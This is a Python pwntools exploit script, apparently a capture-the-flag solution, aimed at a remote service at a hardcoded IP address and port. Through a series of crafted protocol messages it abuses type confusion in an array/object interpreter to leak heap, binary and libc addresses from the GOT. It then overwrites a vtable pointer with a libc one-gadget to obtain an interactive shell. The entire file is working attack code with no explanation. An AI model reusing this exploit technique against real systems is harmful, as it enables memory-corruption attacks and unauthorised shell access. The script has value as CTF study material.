#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"

#port = 8888
host = "52.78.10.103"
port = 31337
for i in range(10):
    try :
        r = remote(host,port)

        def createarray(size,types="\x17"): #\x20 int
            r.send("\x20")
            r.send(p32(0x10001000))
            r.send(types)
            r.send(p64(size))

        def createstr(s):
            r.send("\x20")
            r.send(p32(0x20002000))
            r.send(s.ljust(100,"\x00"))

        def createint(integer):
            r.send("\x20")
            r.send(p32(integer))

        def showbox(idx):
            r.send("\x17")
            r.send("\x22")
            r.send(p64(idx))

        def insertele(arrayidx,srcarrayidx,idx,types = "\x37"): #\x13
            r.send("\x17")
            r.send(types)
            r.send(p64(arrayidx)) #idx
            r.send(p64(srcarrayidx))
            r.send(p64(idx))

        def insertint(arrayidx,intidx,idx):
            r.send("\x17")
            r.send("\x13")
            r.send(p64(arrayidx)) #idx
            r.send(p64(intidx))
            r.send(p64(idx))


        def insertdata(eleidx,idx):
            r.send("\x17")
            r.send("\x11")
            r.send(p64(eleidx))
            r.send(p64(idx))

        def concatarray(a1,a2):
            r.send("\x17")
            r.send("\x33")
            r.send(p64(a1))
            r.send(p64(a2))

        def alu(eleidx,eleidx2,types):
            r.send("\x17")
            r.send("\x77")
            r.send(p64(eleidx))
            r.send(p64(eleidx2))
            r.send(chr(types))

        createint(0x90000000) # 0
        createstr("ddaa") #1
        alu(0,1,1)
        showbox(0)
        r.recvuntil("\n")
        r.recvuntil("\n")
        heap = int(r.recvuntil("]")[1:-1]) - 0x90013e30
        print hex(heap)
        straddr = heap + 0x13fa0 + 2
        createint((straddr) & 0xffffffff)
        createint((straddr) >> 32)
        createint((straddr + 0x30) & 0xffffffff)
        createint((straddr + 0x30) >> 32)
        createarray(3) #2
        createarray(3,"\x20") #3
        insertint(3,1,4)
        insertint(3,3,2)
        insertint(3,2,1)
        insertint(3,0,3)
        concatarray(2,3) #4
        insertdata(4,2)
        insertdata(4,1)
        strctx = p64(0x41414141414141) + p64(0x0000000020002000) + p64(heap+0x13f70)
        createarray(40,"\x20") #8
        createint(0x10000000) #4
        createint(0x11000) #5
        createint(0x7f0000) #6
        createint(0) #7
        vtable = heap+0x11c20 
        createint((vtable & 0xffff) << 16) # 8
        createint((vtable >> 16)) #9
        insertint(7,4,3+8+4)
        insertint(7,5,4+8+4)
        insertint(7,6,5+8+4)
        insertint(7,7,6+8+4)
        insertint(7,6,7+8+4)
        insertint(7,7,8+8+4)
        insertint(7,8,9+8+4) #arrayptr
        insertint(7,9,10+8+4) #arrayptr
        insertint(7,7,11+8+4)
        showbox(6)
        r.recvuntil("[9]")
        r.recvuntil("[")
        ctx =  r.recvuntil("]")[:-1].split(",")
        code = int(ctx[0]) + (int(ctx[1]) << 32) - 0x203ba8
        print hex(code)

        got = code + 0x000000000203ff8

        createint(0) #10
        createint((got & 0xffff) << 16) # 11
        createint((got >> 16)) #12

        insertint(7,11,9+8+4) #arrayptr
        insertint(7,12,10+8+4) #arrayptr
        showbox(6)
        r.recvuntil("[12]")
        r.recvuntil("[")
        gotarray =  r.recvuntil("]")[:-1].split(",")
        libc = int(gotarray[0]) + (int(gotarray[1]) << 32)  - 0x14de60
        print hex(libc)
        system = libc + 0x4526a
        #system = 0x41414141414141
        createint(system & 0xffffffff) #13
        createint(system  >> 32) #14
        arrayvtable = code + 0x203bf8
        createint(((arrayvtable & 0xffff) << 16 )) #15
        createint(arrayvtable >> 16) #16
        insertint(7,15,3+8+2)
        insertint(7,16,3+8+3)

        insertint(6,13,1)
        insertint(6,14,2)
        concatarray(2,3)
        r.interactive()
    except :
        continue
